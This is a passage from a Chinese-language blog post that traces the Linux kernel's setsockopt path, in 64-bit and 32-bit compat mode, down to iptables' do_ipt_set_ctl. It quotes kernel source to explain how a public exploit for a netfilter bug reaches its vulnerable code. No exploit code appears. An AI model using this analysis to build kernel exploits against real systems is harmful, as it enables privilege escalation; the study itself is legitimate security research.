<span class="title function_">inet_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment"> *Tell SOCKET that we are alive...</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">(<span class="type">void</span>)sock_register(&amp;inet_family_ops);</span><br></pre></td></tr></table></figure><p>而在 <code>inet_create()</code> 中，则是遍历 数组找到对应类型的函数表给到 socket：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">inet_create</span><span class="params">(<span class="keyword">struct</span> net *net, <span class="keyword">struct</span> socket *sock, <span class="type">int</span> protocol,</span></span><br><span class="line"><span class="params">       <span class="type">int</span> kern)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inet_protosw</span> *<span class="title">answer</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inet_sock</span> *<span class="title">inet</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proto</span> *<span class="title">answer_prot</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> answer_flags;</span><br><span class="line"><span class="type">int</span> try_loading_module = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (protocol &lt; <span class="number">0</span> || protocol &gt;= IPPROTO_MAX)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">sock-&gt;state = SS_UNCONNECTED;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Look for the requested type/protocol pair. */</span></span><br><span class="line">lookup_protocol:</span><br><span class="line">err = -ESOCKTNOSUPPORT;</span><br><span class="line">rcu_read_lock();</span><br><span class="line">list_for_each_entry_rcu(answer, &amp;inetsw[sock-&gt;type], <span class="built_in">list</span>) &#123;</span><br><span class="line"></span><br><span class="line">err = <span class="number">0</span>;</span><br><span class="line"><span class="comment">/* Check the non-wild match. */</span></span><br><span class="line"><span class="keyword">if</span> (protocol == answer-&gt;protocol) &#123;</span><br><span class="line"><span class="keyword">if</span> (protocol != IPPROTO_IP)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">/* Check for the two wild cases. */</span></span><br><span class="line"><span class="keyword">if</span> (IPPROTO_IP == protocol) &#123;</span><br><span class="line">protocol = answer-&gt;protocol;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (IPPROTO_IP == answer-&gt;protocol)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">err = -EPROTONOSUPPORT;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    sock-&gt;ops = answer-&gt;ops;</span><br><span class="line">    answer_prot = answer-&gt;prot;</span><br></pre></td></tr></table></figure><p>在这里使用内核的 rcu 遍历宏 <code>list_for_each_entry_rcu</code> 对 <code>inetsw</code> 进行遍历，实际上该链表通过 <code>inetsw_array</code> 建立，对于 <code>IPPROTO_IP</code> 而言其函数表应为 <code>inet_stream_ops</code>（我们在建立 socket 时 protocol 指定为 0，即 <code>IPPROTO_IP</code>）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">inet_protosw</span> <span class="title">inetsw_array</span>[] =</span></span><br><span class="line">&#123;</span><br><span class="line">&#123;</span><br><span class="line">.type =       SOCK_STREAM,</span><br><span class="line">.protocol =   IPPROTO_TCP,</span><br><span class="line">.prot =       &amp;tcp_prot,</span><br><span class="line">.ops =        &amp;inet_stream_ops,</span><br><span class="line">.flags =      INET_PROTOSW_PERMANENT |</span><br><span class="line">      INET_PROTOSW_ICSK,</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>因此我们在进行 setsockopt 时其实对应应该调用到 <code>inet_stream_ops</code> 中的 <code>sock_common_setsockopt</code>，他又会调用到 <code>sk-&gt;sk_prot-&gt;setsockopt()</code>，其实就是 socket 结构体里的 sock 结构体里的 sock_common 结构体的 <code>skc_prot</code> 成员（<code>proto</code> 结构体类型）的 <code>setsockopt</code> 函数指针（<del>你套你🦄呢</del>）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sock_common_setsockopt</span><span class="params">(<span class="keyword">struct</span> socket *sock, <span class="type">int</span> level, <span class="type">int</span> optname,</span></span><br><span class="line"><span class="params">   <span class="type">char</span> __user *optval, <span class="type">unsigned</span> <span class="type">int</span> optlen)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span> =</span> sock-&gt;sk;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> sk-&gt;sk_prot-&gt;setsockopt(sk, level, optname, optval, optlen);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(sock_common_setsockopt);</span><br></pre></td></tr></table></figure><p>又绕回前面，这里应该是对应到 <code>tcp_prot</code> 函数表，对应调用到 <code>tcp_setsockopt()</code>，在公开的 exp 中漏洞触发路径指定了 level 为 <code>SOL_IP</code>，所以这里应该会对应调用到 <code>icsk-&gt;icsk_af_ops-&gt;setsockopt</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">tcp_setsockopt</span><span class="params">(<span class="keyword">struct</span> sock *sk, <span class="type">int</span> level, <span class="type">int</span> optname, <span class="type">char</span> __user *optval,</span></span><br><span class="line"><span class="params">   <span class="type">unsigned</span> <span class="type">int</span> optlen)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">inet_connection_sock</span> *<span class="title">icsk</span> =</span> inet_csk(sk);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (level != SOL_TCP)</span><br><span class="line"><span class="keyword">return</span> icsk-&gt;icsk_af_ops-&gt;setsockopt(sk, level, optname,</span><br><span class="line">     optval, optlen);</span><br><span class="line"><span class="keyword">return</span> do_tcp_setsockopt(sk, level, optname, optval, optlen);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(tcp_setsockopt);</span><br></pre></td></tr></table></figure><p>这里 <code>inet_csk()</code> 展开其实就是一个强制类型转换，那这里我们又要转回去看 socket 中 sock 结构体的初始化过程，在 <code>inet_create()</code>  中使用 <code>sock_alloc()</code> 创建 sock 结构体，最后会调用到 <code>tcp_v4_init_sock</code>，这里我们看到其初始化所用的函数表为 <code>ipv4_specific</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">tcp_v4_init_sock</span><span class="params">(<span class="keyword">struct</span> sock *sk)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inet_connection_sock</span> *<span class="title">icsk</span> =</span> inet_csk(sk);</span><br><span class="line"></span><br><span class="line">tcp_init_sock(sk);</span><br><span class="line"></span><br><span class="line">icsk-&gt;icsk_af_ops = &amp;ipv4_specific;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_TCP_MD5SIG</span></span><br><span class="line">tcp_sk(sk)-&gt;af_specific = &amp;tcp_sock_ipv4_specific;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以最后应该调用到 <code>ip_setsockopt</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">inet_connection_sock_af_ops</span> <span class="title">ipv4_specific</span> =</span> &#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">.setsockopt   = ip_setsockopt,</span><br><span class="line">.getsockopt   = ip_getsockopt,</span><br></pre></td></tr></table></figure><p>在  <code>ip_setsockopt</code> 中最终调用到 <code>nf_setsockopt</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">ip_setsockopt</span><span class="params">(<span class="keyword">struct</span> sock *sk, <span class="type">int</span> level,</span></span><br><span class="line"><span class="params"><span class="type">int</span> optname, <span class="type">char</span> __user *optval, <span class="type">unsigned</span> <span class="type">int</span> optlen)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (level != SOL_IP)</span><br><span class="line"><span class="keyword">return</span> -ENOPROTOOPT;</span><br><span class="line"></span><br><span class="line">err = do_ip_setsockopt(sk, level, optname, optval, optlen);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> IS_ENABLED(CONFIG_BPFILTER_UMH)</span></span><br><span class="line"><span class="keyword">if</span> (optname &gt;= BPFILTER_IPT_SO_SET_REPLACE &amp;&amp;</span><br><span class="line">    optname &lt; BPFILTER_IPT_SET_MAX)</span><br><span class="line">err = bpfilter_ip_set_sockopt(sk, optname, optval, optlen);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_NETFILTER</span></span><br><span class="line"><span class="comment">/* we need to exclude all possible ENOPROTOOPTs except default case */</span></span><br><span class="line"><span class="keyword">if</span> (err == -ENOPROTOOPT &amp;&amp; optname != IP_HDRINCL &amp;&amp;</span><br><span class="line">optname != IP_IPSEC_POLICY &amp;&amp;</span><br><span class="line">optname != IP_XFRM_POLICY &amp;&amp;</span><br><span class="line">!ip_mroute_opt(optname))</span><br><span class="line">err = nf_setsockopt(sk, PF_INET, optname, optval, optlen);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(ip_setsockopt);</span><br></pre></td></tr></table></figure><p>而 setsockopt 与 getsockopt 其实都整合到了 <code>nf_sockopt()</code> 中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Call get/setsockopt() */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">nf_sockopt</span><span class="params">(<span class="keyword">struct</span> sock *sk, <span class="type">u_int8_t</span> pf, <span class="type">int</span> val,</span></span><br><span class="line"><span class="params">      <span class="type">char</span> __user *opt, <span class="type">int</span> *len, <span class="type">int</span> get)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nf_sockopt_ops</span> *<span class="title">ops</span>;</span></span><br><span class="line"><span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">ops = nf_sockopt_find(sk, pf, val, get);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(ops))</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(ops);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (get)</span><br><span class="line">ret = ops-&gt;get(sk, val, opt, len);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">ret = ops-&gt;<span class="built_in">set</span>(sk, val, opt, *len);</span><br><span class="line"></span><br><span class="line">module_put(ops-&gt;owner);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">nf_setsockopt</span><span class="params">(<span class="keyword">struct</span> sock *sk, <span class="type">u_int8_t</span> pf, <span class="type">int</span> val, <span class="type">char</span> __user *opt,</span></span><br><span class="line"><span class="params">  <span class="type">unsigned</span> <span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> nf_sockopt(sk, pf, val, opt, &amp;len, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(nf_setsockopt);</span><br></pre></td></tr></table></figure><p>这里我们看出其通过 <code>nf_sockopt_find</code> 找到对应的函数表从而调用其对应的函数，这里 setsockopt 对应调用到的应该是 <code>do_ipt_set_ctl()</code></p><p><img src="https://s2.loli.net/2022/03/29/R4a7BPc8zq9Ko25.png" alt="image.png"></p><p>为什么是这个函数？这里我们回到 <code>nf_sockopt_find</code> 中，其使用内核双向链表遍历宏遍历全局变量<code>nf_sockopts</code>，判断条件是函数表的 pf 等于我们在上层传入的 pf（在 <code>ip_setsockopt</code> 中传入的为 <code>PF_INET</code>）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> nf_sockopt_ops *<span class="title function_">nf_sockopt_find</span><span class="params">(<span class="keyword">struct</span> sock *sk, <span class="type">u_int8_t</span> pf,</span></span><br><span class="line"><span class="params"><span class="type">int</span> val, <span class="type">int</span> get)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nf_sockopt_ops</span> *<span class="title">ops</span>;</span></span><br><span class="line"></span><br><span class="line">mutex_lock(&amp;nf_sockopt_mutex);</span><br><span class="line">list_for_each_entry(ops, &amp;nf_sockopts, <span class="built_in">list</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (ops-&gt;pf == pf) &#123;</span><br><span class="line"><span class="keyword">if</span> (!try_module_get(ops-&gt;owner))</span><br><span class="line"><span class="keyword">goto</span> out_nosup;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (get) &#123;</span><br><span class="line"><span class="keyword">if</span> (val &gt;= ops-&gt;get_optmin &amp;&amp;</span><br><span class="line">val &lt; ops-&gt;get_optmax)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (val &gt;= ops-&gt;set_optmin &amp;&amp;</span><br><span class="line">val &lt; ops-&gt;set_optmax)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line">module_put(ops-&gt;owner);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">out_nosup:</span><br><span class="line">ops = ERR_PTR(-ENOPROTOOPT);</span><br><span class="line">out:</span><br><span class="line">mutex_unlock(&amp;nf_sockopt_mutex);</span><br><span class="line"><span class="keyword">return</span> ops;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>在 iptables 模块的初始化函数中注册了函数表</strong> <code>ipt_sockopts</code>，<code>nf_register_sockopt()</code> 用以在 <code>nf_sockopts</code> 链表中插入节点：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">ip_tables_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Register setsockopt */</span></span><br><span class="line">ret = nf_register_sockopt(&amp;ipt_sockopts);</span><br></pre></td></tr></table></figure><p>那么一切就清楚了，对于 setsockopt 系统调用，我们最终调用的应该是 <code>do_ipt_set_ctl</code> 函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">nf_sockopt_ops</span> <span class="title">ipt_sockopts</span> =</span> &#123;</span><br><span class="line">.pf= PF_INET,</span><br><span class="line">.set_optmin= IPT_BASE_CTL,</span><br><span class="line">.set_optmax= IPT_SO_SET_MAX+<span class="number">1</span>,</span><br><span class="line">.<span class="built_in">set</span>= do_ipt_set_ctl,</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_COMPAT</span></span><br><span class="line">.compat_set= compat_do_ipt_set_ctl,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">.get_optmin= IPT_BASE_CTL,</span><br><span class="line">.get_optmax= IPT_SO_GET_MAX+<span class="number">1</span>,</span><br><span class="line">.get= do_ipt_get_ctl,</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_COMPAT</span></span><br><span class="line">.compat_get= compat_do_ipt_get_ctl,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">.owner= THIS_MODULE,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="32-位下的-setsockopt-系统调用"><a href="#32-位下的-setsockopt-系统调用" class="headerlink" title="32 位下的 setsockopt 系统调用"></a>32 位下的 setsockopt 系统调用</h2><blockquote><p>本次漏洞利用中我们创建 socket 时使用 <code>socket(AF_INTE, SOCK_STREAM, 0)</code>，故后面涉及到的 socket 源码都会顺着这个路径分析</p></blockquote><p>在设置了 <code>CONFIG_COMPAT=y</code> 的情况下（意为兼容 32 位，默认开启），32位程序进行系统调用时<strong>实际上是通过 COMPAT_SYSCALL_DEFINE 宏定义的兼容 32 位系统调用完成的</strong></p><blockquote><p>我们知道 32 位程序通过 0x80 号中断进行系统调用，而 64 位程序则通过 syscall 指令完成系统调用，因此在64位内核中将 0x80 号中断专门用作兼容 32 位进程的系统调用入口</p></blockquote><p>因此当一个 32 位程序进行 setsockopt 系统调用时，最终会调用到 <code>__compat_sys_setsockopt()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">COMPAT_SYSCALL_DEFINE5(setsockopt, <span class="type">int</span>, fd, <span class="type">int</span>, level, <span class="type">int</span>, optname,</span><br><span class="line">       <span class="type">char</span> __user *, optval, <span class="type">unsigned</span> <span class="type">int</span>, optlen)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> __compat_sys_setsockopt(fd, level, optname, optval, optlen);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>其实 glibc 中的 setsockopt 的 wrapper 是通过 <code>socketcall</code> 这一系统调用进行的，实际上在很久以前该系统调用其实是 socket 相关系统调用的唯一入口点，后面各种子功能拆分成了多个系统调用，但是该系统调用仍然保留了下来，因此对于同一个功能，即可以走 socketcall 系统调用，也可以走拆分出来的那个系统调用，最后的路径是相同的</p></blockquote><p>在公开的 exp 中漏洞触发路径指定了 level 为 <code>SOL_IP</code>，故在 <code>__compat_sys_setsockopt()</code>中最终会走到 <code>sock-&gt;ops-&gt;compat_setsockopt</code> 或 <code>sock-&gt;ops-&gt;setsockopt</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> __compat_sys_setsockopt(<span class="type">int</span> fd, <span class="type">int</span> level, <span class="type">int</span> optname,</span><br><span class="line">   <span class="type">char</span> __user *optval, <span class="type">unsigned</span> <span class="type">int</span> optlen)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> err;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">socket</span> *<span class="title">sock</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (optlen &gt; INT_MAX)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">sock = sockfd_lookup(fd, &amp;err);</span><br><span class="line"><span class="keyword">if</span> (sock) &#123;</span><br><span class="line">err = security_socket_setsockopt(sock, level, optname);</span><br><span class="line"><span class="keyword">if</span> (err) &#123;</span><br><span class="line">sockfd_put(sock);</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (level == SOL_SOCKET)</span><br><span class="line">err = compat_sock_setsockopt(sock, level,</span><br><span class="line">optname, optval, optlen);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (sock-&gt;ops-&gt;compat_setsockopt)</span><br><span class="line">err = sock-&gt;ops-&gt;compat_setsockopt(sock, level,</span><br><span class="line">optname, optval, optlen);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">err = sock-&gt;ops-&gt;setsockopt(sock, level,</span><br><span class="line">optname, optval, optlen);</span><br><span class="line">sockfd_put(sock);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里应该走入哪条路径？那么这里我们需要先看创建该函数表的过程，这个函数表其实是在 socket 创建时（<code>__sock_create()</code>）进行动态指定的，通过对应 family 指定的创建函数进行创建：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __sock_create(<span class="keyword">struct</span> net *net, <span class="type">int</span> family, <span class="type">int</span> type, <span class="type">int</span> protocol,</span><br><span class="line"> <span class="keyword">struct</span> socket **res, <span class="type">int</span> kern)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> err;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">socket</span> *<span class="title">sock</span>;</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">net_proto_family</span> *<span class="title">pf</span>;</span></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">rcu_read_lock();</span><br><span class="line">pf = rcu_dereference(net_families[family]);</span><br><span class="line">err = -EAFNOSUPPORT;</span><br><span class="line"><span class="keyword">if</span> (!pf)</span><br><span class="line"><span class="keyword">goto</span> out_release;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We will call the -&gt;create function, that possibly is in a loadable</span></span><br><span class="line"><span class="comment"> * module, so we have to bump that loadable module refcnt first.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (!try_module_get(pf-&gt;owner))</span><br><span class="line"><span class="keyword">goto</span> out_release;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Now protected by module ref count */</span></span><br><span class="line">rcu_read_unlock();</span><br><span class="line"></span><br><span class="line">err = pf-&gt;create(net, sock, protocol, kern);</span><br></pre></td></tr></table></figure><p>比如说对于 <code>AF_INET</code> （<code>PF_INET</code>）而言，应该用到的是 <code>inet_create()</code> 函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">net_proto_family</span> <span class="title">inet_family_ops</span> =</span> &#123;</span><br><span class="line">.family = PF_INET,</span><br><span class="line">.create = inet_create,</span><br><span class="line">.owner= THIS_MODULE,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在 <code>inet_init()</code> 函数中使用 <code>sock_register</code> 在 <code>net_families</code> 数组中注册了该结构体（<code>__init</code> 宏可以看出这是一个模块初始化函数）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">inet_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment"> *Tell SOCKET that we are alive...</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">(<span class="type">void</span>)sock_register(&amp;inet_family_ops);</span><br></pre></td></tr></table></figure><p>而在 <code>inet_create()</code> 中，则是遍历 数组找到对应类型的函数表给到 socket：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 